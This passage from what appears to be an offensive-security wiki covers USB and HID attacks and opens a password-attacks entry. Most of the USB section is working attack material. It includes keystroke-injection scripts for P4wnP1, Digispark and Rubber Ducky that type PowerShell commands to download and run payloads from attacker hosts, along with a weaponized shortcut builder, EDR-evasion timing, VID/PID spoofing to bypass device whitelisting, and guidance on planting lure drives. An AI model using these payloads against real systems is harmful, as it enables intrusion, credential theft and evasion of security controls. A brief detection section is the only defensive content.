(HID + RNDIS/ECM for network-over-USB)\n# - WiFi AP + client mode\n# - Persistent storage (acts as USB mass storage)\n# - Web-based UI accessible over WiFi\n\n# HIDScript (JavaScript-like) example:\ntypingSpeed(0, 0); // instant typing\npress(\"GUI r\");\ndelay(500);\ntype(\"powershell -w h\\n\");\ndelay(1000);\ntype(\"IEX(New-Object Net.WebClient).DownloadString('http://172.16.0.1/p')\\n\");\n```\n\n---\n\n## OMG Cable (O.MG)\n\nThe OMG Cable looks identical to a legitimate Lightning/USB-C cable but contains a WiFi-connected implant:\n\n```\n- Contains: ARM processor, WiFi module, HID injection\n- Range: WiFi AP (~30m), or remotely via internet if configured\n- Operator connects to cable's WiFi AP\n- Web UI: type payloads, manage sessions\n- Self-destructs: can wipe firmware on command\n- Detection: X-ray / physical inspection only; no software detection\n```\n\nAttack workflow:\n1. Leave cable at target's desk (\"forgot\" it, swap their cable)\n2. Target plugs device into cable for charging\n3. Operator connects to cable's WiFi from parking lot\n4. Deliver HID payload through web UI\n5. Cable can be triggered hours/days later\n\n---\n\n## BadUSB (Digispark / Arduino)\n\nBudget HID injection using Digispark (ATtiny85) or Arduino Leonardo:\n\n```cpp\n// Arduino Leonardo sketch (DigiKeyboard.h for Digispark)\n#include \"DigiKeyboard.h\"\n\nvoid setup() {\n DigiKeyboard.delay(2000);\n DigiKeyboard.sendKeyStroke(0); // wake\n\n // Win+R\n DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);\n DigiKeyboard.delay(500);\n\n // Type command\n DigiKeyboard.print(\"powershell -w h -ep bypass -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/p')\\\"\");\n DigiKeyboard.sendKeyStroke(KEY_ENTER);\n}\n\nvoid loop() {}\n```\n\n```bash\n# Program Digispark via Arduino IDE\n# Board: Digispark (Default - 16.5mhz)\n# Upload: plug in after clicking upload (bootloader window)\n# Cost: ~$2/unit on AliExpress\n```\n\n---\n\n## USB Network Adapter (RNDIS) — Pivoting\n\nA USB network adapter forces the target machine to recognize an additional network interface — useful for pivoting:\n\n```bash\n# Raspberry Pi Zero as RNDIS gadget (ethernet over USB)\n# /etc/network/interfaces on Pi:\n# iface usb0 inet static\n# address 172.16.0.1\n# netmask 255.255.255.0\n\n# On victim Windows machine: appears as \"Remote NDIS Compatible Device\"\n# Gets IP 172.16.0.2 via DHCP from Pi\n# If Pi's routing is set up: pivot through Pi's WiFi\n\n# Attack: set Pi as default gateway for victim traffic\n# All traffic from victim PC routes through attacker Pi\n# Combine with mitmproxy for HTTPS interception\n```\n\n---\n\n## Physical Drop Methodology\n\n1. **Reconnaissance**: identify target building, entry points, smoking areas, parking lots\n2. **Preparation**: load payload, test on identical OS version, verify execution\n3. **Labeling**: \"CONFIDENTIAL — Q1 Salary Review\", \"Board Meeting Notes\", company logo sticker\n4. **Drop locations** (ranked by pickup rate):\n - Parking lot near entrance: 48% pickup rate (Tischer et al. study)\n - Smoking area: 35%\n - Lobby/reception: 25%\n - Bathroom: 20%\n5. **Payload design**: auto-execute on Windows (LNK file with embedded payload, no autorun needed)\n6. **C2 callback**: ensure payload phones home over common ports (443, 80)\n7. **Attribution resistance**: no identifying strings in payload\n\n### LNK File Auto-Execute (No Autorun Required)\n\n```powershell\n# Create weaponized LNK that auto-runs when Explorer previews\n$wsh = New-Object -ComObject WScript.Shell\n$shortcut = $wsh.CreateShortcut(\"$env:TEMP\\Salary_Review.lnk\")\n$shortcut.TargetPath = \"powershell.exe\"\n$shortcut.Arguments = '-w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://192.168.1.50/p\\\")\"'\n$shortcut.IconLocation = \"%SystemRoot%\\System32\\shell32.dll,1\" # PDF icon\n$shortcut.Save()\n```\n\n---\n\n## Defensive Countermeasures\n\n| Defense | Bypass |\n|---------|--------|\n| USB port blocking (physical) | USB-C charging cables bypass (data pins blocked) |\n| Group Policy USB restriction | OMG Cable / RNDIS uses whitelisted device class |\n| Endpoint DLP (USB monitoring) | HID devices typically not blocked |\n| USB device whitelisting (Intune) | Spoofed VID/PID to match allowed device |\n| Juice jacking protection | Data-only blocker dongles; attacker's cable bypassed |\n\n---\n\n## Detection\n\n- Windows: Event ID 6416 (new device connected), Event ID 2003 (USB device)\n- Sysmon: Event 6 (raw disk access), network connections from powershell after USB insert\n- EDR: process spawned from keyboard input without visible window → suspicious\n- Physical: USB devices found in drop scenarios → IR cameras at entry points\n\n## ◈ ADVANCED\n\n### EDR-Aware Payload Timing\n\nModern EDR solutions monitor processes spawned from HID input. Timing and method matter:\n\n```ducky\nREM Slow, human-speed typing to evade HID burst detection\nDEFAULTDELAY 150\nREM Use window focus check before typing (OS-aware)\nDELAY 3000\nREM Check for locked screen first (don't type if login screen visible)\nGUI r\nDELAY 600\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass\nENTER\nDELAY 1000\nREM Multi-stage: first stage just downloads, doesn't execute immediately\nSTRING $c=(New-Object Net.WebClient);$c.DownloadFile('https://cdn-update.example.io/update.dat','C:\\Windows\\Temp\\svc.dat')\nENTER\nDELAY 500\n```\n\n```\nEDR evasion via HID timing:\n1. Use variable typing speed (matches human patterns)\n2. Add CAPS_LOCK toggles between bursts (looks like accidental caps)\n3. Stage execution: type downloader only, payload fetched separately\n4. Target: schedule via schtasks (delayed execution) → HID finishes, payload runs later\n → HID connection and payload execution are separate events → harder to correlate\n```\n\n### USB VID/PID Spoofing for Policy Bypass\n\nOrganizations using USB device whitelisting (Intune, ConfigMgr) by VendorID/ProductID:\n\n```cpp\n// Arduino: spoof VID/PID of an allowed device (e.g., Dell keyboard)\n// Edit boards.txt:\n// leonardo.vid.0=0x413C (Dell)\n// leonardo.pid.0=0x2113 (Dell keyboard model)\n// Recompile → device appears as Dell keyboard → whitelisting bypassed\n\n// Bash Bunny VID/PID spoofing:\n// /etc/bb.cfg:\nATTACKMODE HID VID_0x413C PID_0x2113 # Spoof as Dell\n// Intune sees \"Dell Keyboard\" → allowed\n\n// Check target's allowed device list first:\n// Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USB\\* |\n// Where-Object {$_.DeviceDesc -like \"*keyboard*\"} | Select VID, PID\n```\n\n### Firmware-Level BadUSB (Persistent HID)\n\nReflash commercial USB devices to embed persistent payloads:\n\n```\nAffected firmware: Original BadUSB (Nohl 2014) — USB controller firmware\nApplicable devices: USB sticks with Phison 2251-03 controller (common in cheap drives)\n\nAttack: flash custom firmware that adds a HID interface alongside mass storage\n→ Drive appears as both a USB drive AND a keyboard\n→ On every insertion: device types payload first, then functions normally\n→ Victim suspects nothing (drive \"works fine\")\n\nTools: DriveCom (deprecated), Phison 2251-03 firmware toolkit\nLimitation: device-specific; must match firmware exactly or brick the device\n\nModern alternative: USB rubber ducky 3.0 — purpose-built; cheaper than firmware hacking\n```\n\n### Post-Connection Persistence via RNDIS\n\nUsing USB network adapter mode for persistent pivot:\n\n```bash\n# P4wnP1 RNDIS payload: add rogue network interface + set as higher-priority gateway\n\n# On P4wnP1: configure RNDIS with priority routing\n# Windows machine: gets additional NIC at 172.16.0.2\n# P4wnP1: serves as 172.16.0.1 (gateway)\n# Higher-metric route added: victim traffic routes through Pi when available\n\n# Persistent value: even if rebooted, USB device auto-reconnects\n# Windows: USB drivers persist across reboot — device recognized immediately\n\n# Combine with responder on P4wnP1 interface:\n# sudo responder -I usb0 -v\n# All SMB/HTTP/FTP traffic captured as victim interacts normally\n# NTLM hashes → crack → use in network later\n```", "last_updated": "2026-03-18"}, "password-attacks": {"slug": "password-attacks", "title": "Password Attacks", "category": "Initial Access", "content": "# Password Attacks\n\n## ◈ BEGINNER\n\n### What are Password Attacks?\n\nPassword attacks are techniques for obtaining valid credentials — either by guessing them, cracking their hashed representations, or abusing how authentication protocols work.\n\n**Key terms:**\n- **Hash** — a one-way transformation of a password into a fixed-length string. You can't reverse a hash directly, but you can try millions of guesses and compare them.\n- **NTLM hash** — how Windows stores and transmits passwords internally. Format: `aad3b435...:31d6cfe0...`\n- **Password spraying** — trying ONE common password against MANY accounts (avoids lockouts)\n- **Brute force** — trying ALL possible passwords against one account (triggers lockouts)\n- **Kerberoasting** — a technique unique to Active Directory that lets any domain user request service tickets that can be cracked offline\n- **AS-REP roasting** — exploits accounts that don't require Kerberos pre-authentication\n- **Pass-the-Hash (PtH)** — using an NTLM hash directly to authenticate, without knowing the actual password\n- **Credential stuffing** — testing username/password pairs leaked from other breaches\n\n**Why spray instead of brute force?**\nMost organizations lock accounts after 3-5 wrong passwords. Spraying tries one password against 1000 accounts rather than 1000 passwords against one account. If the lockout threshold is 5 attempts per 30 minutes, you can spray once every 35 minutes safely.\n\n**What is hashcat?** The most popular password cracking tool. It runs on your GPU (graphics card), which can try billions of password guesses per second — far faster than a CPU.\n\n**Analogy:** A hash is like a fingerprint from a password.
